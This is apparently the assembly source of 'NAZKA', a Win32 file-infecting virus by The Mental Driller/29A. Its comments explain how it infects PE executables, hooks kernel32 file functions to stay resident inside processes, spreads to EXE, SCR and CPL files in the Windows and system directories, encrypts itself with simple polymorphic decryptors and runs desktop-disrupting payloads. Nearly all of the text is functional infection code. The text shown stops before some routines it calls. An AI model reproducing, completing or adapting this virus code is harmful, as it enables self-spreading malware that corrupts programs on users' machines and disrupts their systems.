.386p ;;;;;;;;;;;;       Virus NAZKA               млллллм млллллм млллллм
.model flat ;;;;;; by The Mental Driller/29A       ллл ллл ллл ллл ллл ллл
locals ;;;;;;;;;;; -------------------------        мммллп плллллл ллллллл
.data ;;;;;;;;;;;; Infection is as follows:        лллмммм ммммллл ллл ллл
;;;;;;;;;;;;;;;;;; - Decryptor in .code section    ллллллл ллллллп ллл ллл
лм л ;;;;;;;;;;;;; - Virus in .reloc section
лплл ;;;;;;;;;;;;; - Original overwritten code at the end of the last section
л  л ;;;;;;;;;;;;; After decryption:
;;; ммм ;;;;;;;;;; - Restoring of the overwritten code with WriteProcessMemory
;;; лмл ;;;;;;;;;; Achievements with this type of infection:
;;; л л ;;;;;;;;;; - .code section mantains original flags
;;;;;; ммм ;;;;;;; - .reloc section (which no longer is named so) can be a
;;;;;;  мп ;;;;;;;  "strange" section of an executable, with EXEC_WRI_READ
;;;;;; лмм ;;;;;;;  flags
;;;;;;;;; м м ;;;; - Original host code is saved and encrypted at the end of
;;;;;;;;; лмп ;;;;  the host.
;;;;;;;;; л л ;;;;
;;;;;;;;;;;; ммм ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;; лмл ;by;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;; л л ;The Mental Driller/29A;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; All the virus is intended to be full compatible with future versions of ;;;;
;; win32 (I mean, I don't use strange things like the VxDCALL0 or ring-0 int ;;
;; callgates, due to the fact that they are exploits, after all, and they can ;
;; be fixed in future versions of the kernel). ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; This virus isn't very good, but I had to made something to probe that I ;;;;
;; can actually code under Win32 systems, and this virus is a look-a-like of ;;
;; a most advanced version that I'm thinking on, making complex-as-the-fuck ;;;
;; decryptors (that's the reason why I save 1000h bytes of code of .text in ;;;
;; the infections, just to test the technique). ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; The virus has two parts: the first sets a per-process residency catching ;;;
;; some common functions to open files, and GetProcAddress to return our ;;;;;;
;; handled address just in case the application uses the function. The second ;
;; part is a runtime infection, which infects all EXEs, SCRs and CPLs on ;;;;;;
;; current, system and windows directory (as always). ;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; PAYLOADS ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; This virus has 3 different payloads based on the GDI library: ;;;;;;;;;;;;;;
;; 1) Draws NAZKA in the desktop with colorful polygons and displays a message;
;;;; box which can't be closed :) ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; 2) Writes "N A Z K A" with the TextOutA function in random positions all ;;;
;;;; over the screen, covering all the desktop. ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; 3) The same as 2, but this time with random-color pixels, with the function;
;;;; SetPixel. ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; This payloads are spawned in a different thread, so they act while the ;;;;;
;;; application runs. ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; POLYMORPHISM ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; The virus is slightly polymorphic, it means, the decryptors are easy to ;;;;
;;; emulate and all that, but I didn't want to leave the virus "nude", and a ;;
;;; single fixed decryptor didn't like me at all. Well, this type of polymor- ;
;;; phism don't like me very much either, but I'm still (!!) working on the ;;;
;;; Tuareg, which will be finished in two or three years :P. ;;;;;;;;;;;;;;;;;;
;; The engine will create three polymorphic decryptors in the beginning of ;;;;
;;; the .text section, and will decrypt the .reloc section (where the virus ;;;
;;; is). ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; I have to apologize because I didn't comment very much of the code. ;;;;;;;;
;; Instead of it, I intend to put names to the functions and labels to be ;;;;;
;; quite explicit (it's my habit lastly), so I hope there isn't many problems ;
;; It's quickly coded also, so many buffer variables are between code instead ;
;; of using the more elegant technique of allocate some local memory for ;;;;;;
;; variables and all that. Maybe in future versions... ;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;; Message on first generation
Titulo  db      'Virus NAZKA 1st Generation by The Mental Driller/29A',0
Mensaje db      'You have been infected with the first generation',0dh,0ah
        db      'of the virus NAZKA by The Mental Driller/29A',0
.code
extrn   ExitProcess:PROC
extrn   MessageBoxA:PROC

Virus_Size      equ     offset End_Virus - offset Inic_Virus
Encrypted_Virus_Size    equ     Virus_Size

Nazka           proc
Inic_Virus      label   dword
                push    eax  ; Size to store the return address
                pusha
                call    GetDeltaOffset
GetDeltaOffset: pop     ebp
                sub     ebp, offset GetDeltaOffset
                mov     [ebp+DeltaOffset], ebp
                mov     [ebp+DeltaOffset2], ebp
                ;; Put the return address
                mov     eax, [ebp+InicIP]
                mov     [esp+20h], eax

                mov     byte ptr [ebp+CounterOfFunctions], 0

                mov     eax, [esp+24h]
                and     eax, 0FFFFF000h
                mov     dword ptr [ebp+Addr_Kernel32], eax
                mov     dword ptr [ebp+AuxCounter], 100h
                lea     eax, [ebp+offset @@Loop_001]
                mov     dword ptr [ebp+SEHReturn], eax

                push    offset MySEH          ; Setup SEH for preventing
                push    dword ptr fs:[0]      ; reading exceptions
                mov     fs:[0], esp

@@Loop_001:     sub     dword ptr [ebp+Addr_Kernel32], 1000h
                mov     eax, [ebp+Addr_Kernel32]
                cmp     word ptr [eax], 'ZM'
                jz    @@MaybeKernelFound
                dec     dword ptr [ebp+AuxCounter]
                jnz   @@Loop_001
                push    ds
                pop     ax
                cmp     ax, 0137h
                jb    @@JumpToHost2    ; No hard-coded address for WinNT
                mov     eax, 0BFF70000h     ; Hard-coded under Win9x
                jmp   @@KernelFound2

@@MaybeKernelFound:
                mov     ebx, [eax+3Ch]
                add     ebx, eax
                cmp     word ptr [ebx], 'EP'
                jnz   @@Loop_001

@@KernelFound2: pop     dword ptr fs:[0]     ; Restore SEH
                pop     ecx                ; Eliminate our handler from stack

                mov     ebx, [ebx+78h]
                add     ebx, eax
                mov     ecx, [ebx+18h]

                mov     esi, [ebx+20h]
                add     esi, eax
   @@Loop_003:  mov     edi, [esi]
                add     edi, eax
                cmp     dword ptr [edi], 'PteG'
                jnz   @@Next_001
                cmp     dword ptr [edi+4], 'Acor'
                jnz   @@Next_001
                cmp     dword ptr [edi+8], 'erdd'
                jnz   @@Next_001
                cmp     word ptr [edi+0Ch], 'ss'
                jnz   @@Next_001
                cmp     byte ptr [edi+0Eh], 0
                jz    @@GetProcAddressFound
   @@Next_001:  add     esi, 4
                loop  @@Loop_003
                jmp   @@JumpToHost
   @@GetProcAddressFound:
                sub     ecx, [ebx+18h]
                neg     ecx
                shl     ecx, 1
                add     ecx, [ebx+24h]
                add     ecx, eax
                movzx   ecx, word ptr [ecx]
                shl     ecx, 2
                add     ecx, [ebx+1Ch]
                add     ecx, eax
                mov     ecx, [ecx]
                add     ecx, eax
                mov     dword ptr [ebp+RVA_GetProcAddress], ecx

                lea     esi, [ebp+CrunchedASCIIs]
                mov     edx, [ebp+Addr_Kernel32]
                mov     [ebp+ModuleToUse], edx
                lea     edx, [ebp+RVAs]
                
                call    GetRVAs
                jc    @@JumpToHost

;; Let's patch the import directory
;; I also use the Jacky Qwerty's idea of patch the GetProcAddress function
;; (implemented in Win32.Cabanas) to catch the functions that many
;; applications obtain via GetProcAddress
                call    PatchImportDirectory

;; All RVAs got!
;; Let's infect directories
                call    RuntimeInfection

;; The payloads! Nice GDI routines spawned in a thread, so they are acting
;; while the process is active. There are three payloads:
;; 1) Draws "NAZKA" with colorful letters and rotates the color of them every
;;    tenth of second.
;; 2) Writes "N A Z K A" all over the screen with green text letters and in
;;    random positions, covering completely the desktop in a few time :)
;; 3) The same as 2 but with pixels instead of text.
                call    Payload

@@JumpToHost:   cmp     dword ptr [ebp+CounterOfFunctions], 2
                jb    @@SimulateExecError
                call    dword ptr [ebp+RVA_GetCurrentProcess]
                push    0
                push    1000h
                lea     ebx, [ebp+End_Virus]
                push    ebx
                mov     ebx, [ebp+RestoreAddress]
                push    ebx
                push    eax
                call    dword ptr [ebp+RVA_WriteProcessMemory]

                popa
                ret

@@SimulateExecError:
                push    00BFF700h  ; Construct NOP/MOV BYTE PTR [BFF70000],0
                push    0005C690h  ; to generate an exception from an "unknown
                jmp     esp        ; module" :)

@@JumpToHost2:  pop     dword ptr fs:[0]  ; Restore original SEH
                pop     eax
                jmp   @@JumpToHost
Nazka           endp

InicIP          dd      offset FakedHost
RestoreAddress  dd      offset FakedHost
CounterOfFunctions db   0

MySEH           proc
                mov     esp, [esp+8]   ; Exception? Restore and jump to the
                db      0BDh           ; specified address
DeltaOffset     dd      0
                jmp     [ebp+SEHReturn]
MySEH           endp

SEHReturn       dd      0
AuxCounter      dd      0

GetRVAs         proc
  @@Loop_004:   lea     edi, [ebp+DecrunchBuffer]
                push    edx
                push    edi
  @@Loop_005:   lodsb
                push    esi
;; 0F0h --> Create
;; 0F1h --> File
;; 0F2h --> Get
;; 0F3h --> DirectoryA
;; 0F4h --> Find
;; 0F5h --> Process
;; 0F6h --> Set
;; 0F7h --> AttributesA
                cmp     al, 0F6h
                ja    @@PutAttributesA
                jz    @@PutSet
                cmp     al, 0F4h
                ja    @@PutProcess
                jz    @@PutFind
                cmp     al, 0F2h
                ja    @@PutDirectory
                jz    @@PutGet
                cmp     al, 0F0h
                ja    @@PutFile
                jb    @@PutDirect
 @@PutCreate:   lea     esi, [ebp+ASC_Create]
                mov     ecx, 6
                jmp   @@Store
 @@PutFile:     mov     eax, 'eliF'
                stosd
                jmp   @@Next_002
 @@PutGet:      lea     esi, [ebp+ASC_Get]
                mov     ecx, 3
                jmp   @@Store
@@PutDirectory: lea     esi, [ebp+ASC_DirectoryA]
                mov     ecx, 0Ah
                jmp   @@Store
@@PutFind:      mov     eax, 'dniF'
                stosd
                jmp   @@Next_002
@@PutProcess:   lea     esi, [ebp+ASC_Process]
                mov     ecx, 7
                jmp   @@Store
@@PutSet:       lea     esi, [ebp+ASC_Set]
                mov     ecx, 3
                jmp   @@Store
@@PutAttributesA: lea   esi, [ebp+ASC_AttributesA]
                mov     ecx, 0Bh
    @@Store:    rep     movsb
                jmp   @@Next_002

 @@PutDirect:   stosb
 @@Next_002:    pop     esi
                or      al, al
                jnz   @@Loop_005
                push    dword ptr [ebp+ModuleToUse]
                call    dword ptr [ebp+RVA_GetProcAddress]
                pop     edx
                or      eax, eax
                jz    @@Error
                mov     [edx], eax
                inc     byte ptr [ebp+CounterOfFunctions]
                add     edx, 4
                cmp     byte ptr [esi], 0
                jnz   @@Loop_004
                clc
                ret
@@Error:        stc
                ret
GetRVAs         endp

ModuleToUse     dd      0

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;
;; PER-PROCESS RESIDENCY: SETTING AND INFECTION
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

PatchImportDirectory proc
                db      0B8h ; MOV EAX,xxxxxxxx
ImageBase       dd      400000h   ; Image base, set on infection time
                mov     ebx, [eax+3Ch]
                add     ebx, eax
                cmp     word ptr [ebx], 'EP'
                jnz   @@End
                mov     ecx, [ebx+84h]
                mov     ebx, [ebx+80h]
                add     ebx, eax
@@SearchModule: mov     esi, [ebx+0Ch]
                or      esi, esi
                jz    @@End
                add     esi, eax
 @@ToLowerCase: mov     edx, [esi]
                call    ToLower
                cmp     edx, 'nrek'
                jnz   @@NextModule
                mov     edx, [esi+4]
                call    ToLower
                cmp     edx, '23le'
                jz    @@Found
 @@NextModule:  add     ebx, 14h
                sub     ecx, 14h
                jnz   @@SearchModule
                jmp   @@End

      @@Found:  mov     esi, [ebx+10h]
                add     esi, eax
                cld
                
                lea     ebx, [ebp+FunctionsToPatch]
  @@Loop_001:   mov     edi, ebx
                lodsd
                or      eax, eax
                jz    @@End
                mov     ecx, 0Fh
                repnz   scasd
                jnz   @@Loop_001
                sub     edi, ebx
                mov     eax, [ebp+edi+FunctionsAddress-4]
                add     eax, ebp
                mov     [esi-4], eax
                jmp   @@Loop_001
       @@End:   ret
PatchImportDirectory endp

FunctionsAddress label  dword
dd      offset My_GetProcAddress
dd      offset My_CreateFileA
dd      offset My_CreateProcessA
dd      offset My_FindFirstFileA
dd      offset My_FindNextFileA
dd      offset My_GetFileAttributesA
dd      offset My_SetFileAttributesA
dd      offset My_GetFullPathNameA
dd      offset My_MoveFileA
dd      offset My_CopyFileA
dd      offset My_DeleteFileA
dd      offset My_WinExec
dd      offset My__lopen
dd      offset My_MoveFileExA
dd      offset My_OpenFile

;,,,,,,,,,,,,,,,,,,,,,,,,,
;; PER-PROCESS FUNCTIONS ;
;'''''''''''''''''''''''''
GetDelta        proc
                mov     eax, 12345678h
                org     $-4
DeltaOffset2    dd      0
                ret
GetDelta        endp

My_GetProcAddress       proc
                        call    GetDelta
                        push    ecx
                        add     eax, offset @@ReturnHere
                        mov     ecx, eax
                        xchg    eax, [esp+4]
                        mov     [ecx+1], eax
                        pop     ecx
                        call    GetDelta
                        mov     eax, [eax+RVA_GetProcAddress]
                        jmp     eax
        @@ReturnHere:   db      68h
ReturnGetProcAddress    dd      0
                        or      eax, eax
                        jz    @@Return
                        pusha
                        push    eax
                        call    GetDelta
                        xchg    ebp, eax
                        pop     eax
                        lea     esi, [ebp+RVAs]
                        lea     edi, [ebp+RVAs+0Eh*4]
                        mov     ebx, esi
                        xchg    ecx, eax
           @@Loop_GPA:  lodsd
                        cmp     eax, ecx
                        jnz   @@Next_GPA
                        sub     esi, ebx
                        add     esi, ebp
                        mov     eax, [esi+FunctionsAddress+4]
                        mov     [esp+1Ch], eax ; Substitute EAX to function
                                               ; by our function address
                        jmp   @@Return2
           @@Next_GPA:  cmp     esi, edi
                        jnz   @@Loop_GPA
            @@Return2:  popa
            @@Return:   ret  ; Ufffh... I hope this work
My_GetProcAddress       endp ; (later) It worked! :)

My_CreateFileA          proc
                        call    GetDelta
                        mov     eax, [eax+RVA_CreateFileA]
                        jmp     InfectByPerProcess
My_CreateFileA          endp

InfectByPerProcess      proc
                        push    eax
                        pusha
                        call    GetDelta
                        xchg    ebp, eax
                        mov     ebx, [esp+28h]
                        lea     eax, [ebp+FindFileField]
                        push    eax
                        push    ebx
                        call    dword ptr [ebp+RVA_FindFirstFileA]
                        inc     eax
                        jz    @@Return
                        dec     eax
                        push    eax
                        call    InfectFile
                        call    dword ptr [ebp+RVA_FindClose]
         @@Return:      popa
                        ret     ; Jump to kernel function
InfectByPerProcess      endp

My_CreateProcessA       proc
                        call    GetDelta
                        mov     eax, [eax+RVA_CreateProcessA]
                        jmp     InfectByPerProcess
My_CreateProcessA       endp

FindFirstIdent  db      0

My_FindNextFileA        proc
                        call    GetDelta
                        mov     byte ptr [eax+FindFirstIdent], 0
                        jmp     Common_FindFile
My_FindNextFileA        endp

My_FindFirstFileA       proc
                        call    GetDelta
                        mov     byte ptr [eax+FindFirstIdent], 1
       Common_FindFile: add     eax, offset @@ReturnHere
                        push    ecx
                        mov     ecx, eax
                        xchg    eax, [esp+4]
                        mov     [ecx+1], eax
                        mov     eax, [esp+0Ch] ; We put the buffer address...
                        mov     [ecx+0Dh], eax ; ...here
                        pop     ecx
                        call    GetDelta
                        cmp     byte ptr [eax+FindFirstIdent], 1
                        jz    @@PutFindFirst
       @@PutFindNext:   mov     eax, [eax+RVA_FindNextFileA]
                        jmp     eax
       @@PutFindFirst:  mov     eax, [eax+RVA_FindFirstFileA]
                        jmp     eax
        @@ReturnHere:   db      68h ; PUSH Value
                        dd      0        ; +1
                        pusha            ; +5
                        inc     eax      ; +6
                        jnz   @@ItsOK    ; +7
                        dec     eax      ; +9
                        jmp   @@Return   ; +A
          @@ItsOK:      db      0BEh ; MOV ESI,Value   ; +C
          @@ESIValue:   dd      0                      ; +D
                        call    GetDelta
                        xchg    ebp, eax
                        lea     edi, [ebp+FindFileField]
                        mov     ecx, FindFileFieldSize
                        cld
                        rep     movsb
                        dec     byte ptr [ebp+InfectFileNow]
                        jnz   @@Return
                        mov     byte ptr [ebp+InfectFileNow], 3
                        call    InfectFile
              @@Return: popa
                        ret
My_FindFirstFileA       endp

InfectFileNow   db      3

My_GetFileAttributesA   proc
                        call    GetDelta
                        mov     eax, [eax+RVA_GetFileAttributesA]
                        jmp     InfectByPerProcess
My_GetFileAttributesA   endp

My_SetFileAttributesA   proc
                        call    GetDelta
                        mov     eax, [eax+RVA_SetFileAttributesA]
                        jmp     InfectByPerProcess
My_SetFileAttributesA   endp

My_GetFullPathNameA     proc
                        call    GetDelta
                        mov     eax, [eax+RVA_GetFullPathNameA]
                        jmp     InfectByPerProcess
My_GetFullPathNameA     endp

My_MoveFileA            proc
                        call    GetDelta
                        mov     eax, [eax+RVA_MoveFileA]
                        jmp     InfectByPerProcess
My_MoveFileA            endp

My_CopyFileA            proc
                        call    GetDelta
                        mov     eax, [eax+RVA_CopyFileA]
                        jmp     InfectByPerProcess
My_CopyFileA            endp

My_DeleteFileA          proc
                        call    GetDelta
                        mov     eax, [eax+RVA_DeleteFileA]
                        jmp     InfectByPerProcess
My_DeleteFileA          endp

My_WinExec              proc
                        call    GetDelta
                        mov     eax, [eax+RVA_WinExec]
                        jmp     InfectByPerProcess
My_WinExec              endp

My__lopen               proc
                        call    GetDelta
                        mov     eax, [eax+RVA__lopen]
                        jmp     InfectByPerProcess
My__lopen               endp

My_MoveFileExA          proc
                        call    GetDelta
                        mov     eax, [eax+RVA_MoveFileExA]
                        jmp     InfectByPerProcess
My_MoveFileExA          endp                        

My_OpenFile             proc
                        call    GetDelta
                        mov     eax, [eax+RVA_OpenFile]
                        jmp     InfectByPerProcess
My_OpenFile             endp

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;
;;; RUN-TIME INFECTION
;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

RuntimeInfection proc
                call    InfectCurrentDir
                push    80h
                lea     eax, [ebp+Directory2]
                push    eax
                call    dword ptr [ebp+RVA_GetCurrentDirectoryA]
                call    InfectWindowsDir
                call    InfectSystemDir
                lea     eax, [ebp+Directory2]
                push    eax
                call    dword ptr [ebp+RVA_SetCurrentDirectoryA]
                ret
RuntimeInfection endp

Directory1      db      80h dup (0)
Directory2      db      80h dup (0)

InfectSystemDir proc
                mov     ebx, [ebp+RVA_GetSystemDirectoryA]
Common_InfectDir:
                push    80h
                lea     eax, [ebp+Directory1]
                push    eax
                call    ebx
                or      eax, eax
                jz    @@Return
                call    SetDirectory1
                call    InfectCurrentDir
@@Return:       ret
InfectSystemDir endp

InfectWindowsDir proc
                mov     ebx, [ebp+RVA_GetWindowsDirectoryA]
                jmp     Common_InfectDir
InfectWindowsDir endp
                
SetDirectory1   proc
                lea     eax, [ebp+Directory1]
                push    eax
                call    dword ptr [ebp+RVA_SetCurrentDirectoryA]
                ret
SetDirectory1   endp

InfectCurrentDir proc
                call    DeleteDATs
                lea     ecx, [ebp+FindFileMask1]
                call    InfectCurrentDir2
                lea     ecx, [ebp+FindFileMask2]
                call    InfectCurrentDir2
                lea     ecx, [ebp+FindFileMask3]
                call    InfectCurrentDir2
                ret
InfectCurrentDir endp

InfectCurrentDir2 proc
                lea     ebx, [ebp+FindFileField]
                push    ebx
                push    ecx
                call    dword ptr [ebp+RVA_FindFirstFileA]
                inc     eax
                jz    @@Fin0
                dec     eax
                mov     dword ptr [ebp+FindFileHandle], eax
@@InfectAgain:  call    InfectFile
                lea     ebx, [ebp+FindFileField]
                push    ebx
                push    dword ptr [ebp+FindFileHandle]
                call    dword ptr [ebp+RVA_FindNextFileA]
                or      eax, eax
                jnz   @@InfectAgain
                push    dword ptr [ebp+FindFileHandle]
                call    dword ptr [ebp+RVA_FindClose]
     @@Fin0:    ret
InfectCurrentDir2 endp

FindFileHandle  dd      0

InfectFile      proc
                mov     ebx, [ebp+CreationTime]
                and     ebx, 3
                cmp     bl, 3
                jz    @@End        ; Infection mark
                lea     ebx, [ebp+FileName]
                call    CheckFileName
                jc    @@End
                push    80h
                push    ebx
                call    dword ptr [ebp+RVA_SetFileAttributesA]
                call    OpenFile
                jc    @@End2
                call    MapFile
                or      eax, eax
                jz    @@End3
                mov     dword ptr [ebp+MappingAddress], eax
                mov     edi, eax
                cmp     word ptr [edi], 'ZM'
                jnz   @@End4
             ;   cmp     word ptr [edi+12h], 'DM'
             ;   jz    @@End4
                mov     esi, [eax+3Ch]
                add     esi, edi
                mov     [ebp+PEHeaderAddress], esi
                cmp     word ptr [esi], 'EP'
                jnz   @@End4
;; ESI=Header address, EDI=Mapping address (beginning of file)

;; Manner of infecting the file:
;; 1) The section .reloc is anulated
;; 2) We check if reloc is quite big to contain the virus. If not, we exit
;; 3) We copy from .text to the end of the last section the portion of code
;;   that is going to be overwritten
;; 4) We copy the virus to .reloc and we change the name of the section by
;;   another randomly generated
;; 5) We overwrite .text section with the decryptor (we check if .text is big
;;   enough to contain this).
;; 6) When execution, .text must be restored from the saved data. All other
;;   things (reloc, etc.) can remain.

                movzx   ebx, word ptr [esi+14h]
                movzx   ecx, word ptr [esi+06h]
                lea     ebx, [ebx+esi+18h]
                mov     eax, 28h
                push    ebx
                push    ecx
                dec     ecx
                mul     ecx
                add     ebx, eax
                sub     ebx, edi
                mov     [ebp+LastHeader], ebx ; In EBX, the physical address
                                         ; of the header of the last section
                pop     ecx
                pop     eax
                mov     dword ptr [ebp+TextHeader], 0
                mov     dword ptr [ebp+RelocHeader], 0
   @@Loop_001:  cmp     dword ptr [eax], 'xet.'
                jnz   @@LookForReloc
                cmp     dword ptr [eax+4], 0+'t'
                jnz   @@NextSection
                sub     eax, edi
                mov     [ebp+TextHeader], eax ; Physical address of .text
                add     eax, edi
                jmp   @@NextSection
@@LookForReloc: cmp     dword ptr [eax], 'ler.'
                jnz   @@NextSection
                cmp     dword ptr [eax+4], 0+'co'
                jnz   @@NextSection
                sub     eax, edi
                mov     [ebp+RelocHeader], eax ; Physical address of .reloc
                add     eax, edi
@@NextSection:  add     eax, 28h
                loop  @@Loop_001
                cmp     [ebp+TextHeader], ecx ; 0?
                jz    @@End4
                mov     eax, [ebp+RelocHeader]
                or      eax, eax
                jz    @@End4
                cmp     eax, [ebp+LastHeader] ; Is last section the reloc?
                jnz   @@End4                  ; If it isn't, exit

                mov     dword ptr [esi+98h], 0
                mov     dword ptr [esi+9Ch], 0 ; Anulate relocs
                mov     eax, [esi+28h]
                mov     ebx, [esi+34h]
                add     eax, ebx
                mov     [ebp+InicIP], eax
                mov     [ebp+ImageBase], ebx

                mov     eax, [ebp+TextHeader]
                add     eax, edi
                cmp     dword ptr [eax+08h], 1000h
                jb    @@End4
                cmp     dword ptr [eax+10h], 1000h
                jb    @@End4
                mov     eax, [ebp+RelocHeader]
                add     eax, edi
                mov     ebx, Virus_Size+1000h
                cmp     dword ptr [eax+08h], ebx
                jae   @@SizeIsOK_1
                mov     dword ptr [eax+08h], ebx
  @@SizeIsOK_1: cmp     dword ptr [eax+10h], ebx
                jae   @@SizeIsOK_2
 @@SizeIsNotOK: sub     ebx, [eax+10h]
                mov     ecx, eax
                xchg    ebx, eax
                mov     ebx, [esi+38h]
                xor     edx, edx
                div     ebx
                inc     eax
                mul     ebx
                add     [ecx+10h], eax
                add     [ebp+FileSizeLow], eax
                add     [esi+50h], eax
                call    UnmapFile
                call    MapFile
                or      eax, eax
                jz    @@End3
                mov     dword ptr [ebp+MappingAddress], eax
                mov     edi, eax
                mov     esi, [edi+3Ch]
                add     esi, edi
  @@SizeIsOK_2:

                ;; This must be sustituted by an entrypoint to the very
                ;; beginning of the .text section. This time (to test) we
                ;; set the entrypoint at the beginning of the .reloc section
                ;; (last section)

                  mov   eax, [ebp+TextHeader]
                  add   eax, edi
                  mov   ebx, [eax+0Ch]
                  mov   [esi+28h], ebx
                  add   ebx, [esi+34h]
                  mov   [ebp+RestoreAddress], ebx
                  mov   ecx, [eax+14h]
                  add   ecx, edi
                             
                  mov   eax, [ebp+RelocHeader]
                  add   eax, edi
                  or    dword ptr [eax+24h], 0A0000020h


               ;   mov   eax, [eax+0Ch]
               ;   mov   [esi+28h], eax

                call    ConstructNameForReloc
                push    edi
                xchg    edi, eax
                mov     edi, [ebp+RelocHeader]
                add     edi, eax
                mov     edi, [edi+14h]
                add     edi, eax

                  push  esi
                  lea   esi, [ebp+Nazka]
                  mov   ecx, Virus_Size / 4

                  push  eax
                  call  CreateEncryptions
                  call  EncryptWhileStoring
                  pop   eax

                  mov   esi, [ebp+TextHeader]
                  add   esi, eax
                  mov   esi, [esi+14h]
                  add   esi, eax
                  mov   ecx, 400h
                  call  EncryptWhileStoring

                  pop   esi

                pop     edi
            ;    mov     word ptr [edi+12h], 'DM'

                  mov   eax, [ebp+TextHeader]
                  add   eax, edi
                  mov   ebx, [eax+0Ch]
                  add   ebx, [esi+34h]
                  mov   ecx, [eax+14h]
                  add   ecx, edi
                  
                  mov   eax, [ebp+RelocHeader]
                  add   eax, edi
                  mov   eax, [eax+0Ch]
                  add   eax, [esi+34h]
                  sub   eax, ebx
                ;  sub   eax, 5

               ; EAX=Displacement from the beginning till the virus
               ; ECX=Place where the decryptors must be put
               ; Size of encrypted part is Virus_Size+1000h

                  call  PutDecryptors

             ;     mov   byte ptr [ecx], 0E9h
             ;     mov   dword ptr [ecx+1], eax

                or      dword ptr [ebp+CreationTime], 3

       @@End4:  call    UnmapFile
       @@End3:  call    RestoreDateTime
                push    dword ptr [ebp+FileHandle]
                call    dword ptr [ebp+RVA_CloseHandle]

       @@End2:  push    dword ptr [ebp+FileAttributes]
                lea     ebx, [ebp+FileName]
                push    ebx
                call    dword ptr [ebp+RVA_SetFileAttributesA]
       @@End:   ret           
InfectFile      endp

TextHeader              dd      0
RelocHeader             dd      0
LastHeader              dd      0
StartOfLastSection      dd      0
PEHeaderAddress         dd      0

EncryptWhileStoring proc
   @@EncryptLoop: mov   edx, 2
                  lodsd
      @@Loop_001: cmp   byte ptr [ebp+edx+EncryptType], 1
                  jb  @@ADD
                  jz  @@SUB
        @@XOR:    xor   eax, dword ptr [4*edx+ebp+DecryptKey]
                  jmp @@Next
        @@ADD:    add   eax, dword ptr [4*edx+ebp+DecryptKey]
                  jmp @@Next
        @@SUB:    sub   eax, dword ptr [4*edx+ebp+DecryptKey]
        @@Next:   dec   edx
                  jns @@Loop_001
                  stosd
                  loop @@EncryptLoop
                  ret
EncryptWhileStoring endp

CreateEncryptions proc
                pusha
      @@Again:  call    Random
                jz    @@Again
                mov     [ebp+DecryptKey], eax
      @@Again2: call    Random
                jz    @@Again2
                cmp     [ebp+DecryptKey], eax
                jz    @@Again2
                mov     [ebp+DecryptKey+4], eax
      @@Again3: call    Random
                jz    @@Again3
                cmp     [ebp+DecryptKey], eax
                jz    @@Again3
                cmp     [ebp+DecryptKey+4], eax
                jz    @@Again3
                mov     [ebp+DecryptKey+8], eax

                mov     ecx, 3
    @@OtraVez:  call    Random
                and     al, 3
                jz    @@OtraVez
                dec     al
                mov     byte ptr [ebp+ecx+EncryptType-1], al
                loop  @@OtraVez

                popa
                ret
CreateEncryptions endp

EncryptType     db      0, 0, 0  ; 0=ADD, 1=SUB, 2=XOR
DecryptKey      dd      0, 0, 0

; Help with stack positions
S_EAX   equ     1Ch
S_ECX   equ     18h
S_EDX   equ     14h
S_EBX   equ     10h
